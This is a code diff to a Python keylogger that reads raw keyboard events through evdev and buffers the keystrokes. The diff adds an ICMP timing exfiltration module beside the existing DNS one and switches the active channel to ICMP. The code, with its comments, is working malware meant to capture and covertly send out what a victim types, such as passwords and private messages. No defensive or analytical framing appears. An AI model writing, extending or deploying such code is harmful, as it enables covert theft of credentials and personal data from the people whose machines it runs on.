@@ -1,6 +1,10 @@
 import evdev
 from evdev import InputDevice, categorize, ecodes
-from dns_exfil import send_data_over_dns  # Ensure dns_exfil.py is in the same folder
+
+# --- EXFILTRATION MODULES ---
+# We import both so you can easily switch between them
+from dns_exfil import send_data_over_dns
+from icmp_exfil import send_data_over_icmp  # <--- NEW IMPORT
 
 def find_keyboard_path():
     """
@@ -69,7 +73,14 @@ try:
                 # 3. Check if buffer is full, then EXFILTRATE
                 if len(keystroke_buffer) >= SEND_THRESHOLD:
                     print(f"\n[>] Sending Buffer: {keystroke_buffer}")
-                    send_data_over_dns(keystroke_buffer)
+                    
+                    # --- SWITCHING TO ICMP ---
+                    # To use DNS instead, uncomment the line below:
+                    # send_data_over_dns(keystroke_buffer)
+                    
+                    # Current active method: ICMP Timing
+                    send_data_over_icmp(keystroke_buffer) 
+                    
                     keystroke_buffer = "" # Reset buffer
 
 except KeyboardInterrupt:
